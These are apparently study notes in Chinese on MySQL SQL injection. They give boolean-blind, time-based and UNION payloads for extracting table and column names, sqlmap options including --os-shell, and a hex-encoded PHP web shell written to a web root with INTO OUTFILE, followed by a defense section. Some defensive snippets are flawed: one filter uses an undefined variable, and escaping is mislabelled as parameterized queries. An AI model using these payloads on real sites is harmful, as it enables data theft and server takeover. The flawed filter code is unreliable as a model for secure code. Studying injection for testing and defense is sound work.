# 基础知识

## 语句

- 语句分号结尾
- 逻辑判断用“=”，不是“==”
- 注释
  - `-- `,`--+` + 在某些场景下被编码为空格
  - `#`

- show databases;查看数据库
- use mysql;切换数据库
- select database();显示当前数据库名称
- show tables;查看表
- select * from user;查看字段
- select host, user, passwd from mysql.user;跨库查询

## infomation_schema数据库

储存mysql数据库管理软件的数据库与表结构信息

```
information_schema
    -
    |-schemata   所有数据库名称
    |-tables     所有表的名称
    |-columns    储存表中所有列名称，以及属于哪个表
```

# 漏洞利用

## 漏洞原理

1. 程序编写者在处理程序和数据库交互时，使用字符串拼接的方式构造SQL 语句。

1. 未对用户可控参数进行足够的过滤，便便将参数内容拼接到SQL 语句中。

## sql漏洞类型

1. 数字型。

2. 字符型。

> 判断方式：输入`2-1`看看是否报错。

## sql漏洞利用方式

### 主流方式

3. 布尔盲注。`id=1' and ascii(substr(database(), 3, 1))=99--+`

尝试不同`115`变量，界面变化，代表试出正确值。

2. 延时盲注。`id=2' and if(length(database())=8, sleep(5), 1)--+`

尝试不同`8`变量，响应时间变成 5+second ，代表试出正确值。

1. 报错注入。

2. 联合查询。
   - 条件：一是字段数相同，二是数据类型相同。

    1. column数。
   
`order by`判断columns数。`order by`按字段排序，后面是根据的column编号，编号从1开始。

`id=1' order by 2--+`

    1. database名字。
   
`union`联合查询,column数必须相同。union前查询结果与后查询结果在同一个表中显示。

`id=1' and 1=1 union select 1, database(), 3--+`

    3. table名。从目标数据库中提取所有表名

**代码**：
```sql
id = 1 and 1 = 2 union 
select 1, group_concat(table_name), 3 from information_schema.tables
where table_schema = database()--+
```

**攻击效果**
如果注入成功，数据库会返回类似：
```
1 | users,products,admins | 3
```
知道当前数据库的所有表名，进而进一步攻击（如查询 `users` 表获取密码）。

**原理解释**

`id = 1 and 1=2`
  - **目的**：让前一部分查询返回空结果（`1=2` 永远为假），这样 `UNION` 后的查询结果才会显示出来。
  - **攻击技巧**：绕过正常查询，使数据库只返回注入的 `UNION SELECT` 结果。

`table_schema`数据库名变量

`group_concat()`
  - **功能**：将多行数据合并成一个字符串，默认用逗号分隔。
  - **在这里的作用**：把 `information_schema.tables` 中的所有表名合并成一个字符串返回，方便攻击者一次性获取所有表名。

    1. column值。
```sql
?id=111 union select 1, group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = 'users'--+

?id=111' union select 1, group_concat(column_name), 3 from information_schema.columns where table_schema = database() and table_name = "uagents"--+
``` 

### 其他方式

#### sql注入工具——sqlmap

`sqlmap -u "url" --batch --dbs`

```
-u 检测注⼊点

–-batch 所有选项默认

–-dbs 列出所有的库名

–current-user 当前连接数据库⽤户的名字

–current-db 当前数据库的名字

-D “mysql” 指定目标数据库为mysql

–tables 列出数据库中所有的表名

-T “user” 指定目标表名为’user’

–columns 列出所有的字段名

-C ‘username,password’ 指定目标字段

–-dump 列出字段内容

-r 从文件中读取HTTP 请求

–os-shell 在特定情况下，可以直接获得目标系统Shell

–level 3 设置sqlmap 检测等级 3

```

#### getshell

hex编码

```sql
select 0x3c3f70687020406576616c28245f4745545b2778275d293b203f3e into outfile 'E:/phpStudy/WWW/1.php'
select "123" into outfile 'E:/phpStudy/WWW/1.txt';
```

#### SQL文件读写

sql读文件需满足条件

1.secure_file_priv值允许对该路径下的文件进行操作

2.数据库用户（mysql的属主）对文件有读权限

3.当前数据库登录用户拥有file权限

查看方法：mysql> show grants for 用户名@localhost;
在这里插入图片描述4.知道文件的完整路径

5.文件大小小于max_allowed_packet（load_file()函数受到这个值的限制）

查看方法：mysql> show global variables like 'max_allowed%';
修改方法：mysql> set global max_allowed_packet = 5\*1024\*1024;

# SQL漏洞防御

- **使用参数化查询（Prepared Statements）**，避免SQL注入。
- **限制数据库权限**，避免普通查询能访问 `information_schema`。
- **过滤特殊字符**（如 `UNION`、`--`、`information_schema`）。

过滤特殊字符，采用参数化查询，使用户输入的参数永远为普通字符，不会被作为特殊符号打乱原有sql语句。
```php
$mysqli = new mysqli("localhost", "root", "root", "dvwa");

$sqli = "a'b\"c";
$safeinsert = preg_replace("/[\'\"]+/", '', $sqli);//正则过滤单双引号
$safeinsert = str_replace("select", "_", $id);//过滤select关键字，可以大小写双写绕过
echo $safeinsert;

$name = "Jack";
$age = 30;
$gender = "male";
$sentence = sprintf("My name is %s. I am %d years old and I am a %s.", $name, $age, $gender);

echo $sentence;

//参数化查询
$mysqli = new mysqli("localhost", "root", "root", "pikachu");
$id="111'";
$query=sprintf("select * from users where id='%s'",mysqli_real_escape_string($mysqli,$id));
echo $query;

?>
```

```

1. 建议修改Web应用服务的软件部分，增加对客户端提交数据（如表单、URL链接）的合法性验证，至少严格**过滤SQL语句中的关键字**，并且所有验证都应该在**服务器端**实现，以防客户端（浏览器前端）控制被绕过。

验证部分为get方法中URL后面跟的参数，及post方法中Post的数据参数，需过滤的关键字为：
    [1] ' 单引号
    [2] " 双引号
    [3] % 百分号
    [4] () 括号
    [5] <> 尖括号
    [6] ; 分号
    [7]— 双减号
    [8]+  加号
    [9]SQL关键字，如select，delete，drop等等，注意对于关键字要对**大小写**都识别，如:select ;SELECT;seLEcT等都应识别。

2. 使用预处理执行SQL语句，对所有传入SQL语句中的变量，做绑定。这样，用户拼接进来的变量，无论内容是什么，都会被当做替代符号"?"所替代的值，数据库也不会把恶意用户拼接进来的数据，当做部分SQL语句去解析。

3. 建议**降低Web应用访问使用较低权限**的用户访问数据库。不要使用数据库管理员等高权限的用户访问数据库。

4. 建议**使用较低权限的操作系统帐户**启动数据库，不要使用root，或Administrator等帐户启动数据库。

```

- 预处理语句
  
```
$mysqli = new mysqli("localhost", "root", "root", "pikachu");
$id = "111'"; // 恶意输入示例

// 使用预处理语句
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("s", $id); // 自动处理转义
$stmt->execute();
$result = $stmt->get_result();

while ($row = $result->fetch_assoc()) {
    print_r($row);
}
```

- 严格校验输入
  - 强制类型转换,数字
  - 白名单过滤，字符串

```
$id = intval($_GET['id']); // 确保 $id 是整数
$query = "SELECT * FROM users WHERE id = $id";

$allowed_ids = ['111', '222', '333'];
if (!in_array($id, $allowed_ids)) {
    die("Invalid ID");
}
```